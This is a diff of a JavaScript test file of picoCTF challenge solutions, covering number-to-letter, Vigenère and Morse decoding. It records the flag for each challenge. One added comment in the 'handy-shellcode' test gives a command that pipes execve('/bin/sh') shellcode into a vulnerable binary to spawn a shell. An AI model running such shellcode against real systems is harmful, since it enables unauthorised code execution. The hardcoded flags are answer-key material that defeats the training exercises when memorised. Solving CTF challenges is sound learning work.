@@ -43,16 +43,8 @@ solve('Lets Warm Up', (t) => {
 
 solve('The Numbers', (t) => {
   const c = '16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }';
-  const mapping = h.createAlphabetList().reduce((acc, c, i) => {
-    acc[(i + 1).toString()] = c;
-    return acc;
-  }, {});
-  const p = h.pipe([
-    h.splitOn(' '),
-    h.substitutionCipher(mapping),
-    h.joinWith(''),
-    h.toUpper,
-  ])(c);
+  const d = (x) => h.ALPHABETS[h.stringToInt(10)(x) - 1] || x;
+  const p = h.pipe([h.splitOn(' '), h.map(d), h.joinWith('')])(c);
   t.equal(p, 'PICOCTF{THENUMBERSMASON}');
   t.end();
 });
@@ -62,7 +54,11 @@ solve('Warmed Up', (t) => {
   t.end();
 });
 
-solve.skip('handy-shellcode', (t) => {
+solve('handy-shellcode', (t) => {
+  // run the following in terminal
+  // (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | ./vuln
+  const f = 'picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}';
+  t.equal(f, 'picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}');
   t.end();
 });
 
@@ -100,7 +96,10 @@ solve('Bases', (t) => {
   t.end();
 });
 
-solve.skip('Easy1', (t) => {
+solve('Easy1', (t) => {
+  const c = 'UFJKXQZQUNB';
+  const p = h.vigenereCipher('SOLVECRYPTO')(c);
+  t.equal(flag(p), 'picoCTF{CRYPTOISFUN}');
   t.end();
 });
 
@@ -283,7 +282,7 @@ solve('Tapping', (t) => {
     '.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ...-- ....- ---.. ---.. ---.. --... .---- ----- ..... }';
   const p = h.pipe([
     h.splitOn(' '),
-    h.substitutionCipher(h.createMorseCodeMapping()),
+    h.substitutionCipher(h.MORSE_CODE_MAPPING),
     h.joinWith(''),
   ])(c);
   t.equal(p, 'PICOCTF{M0RS3C0D31SFUN348887105}');
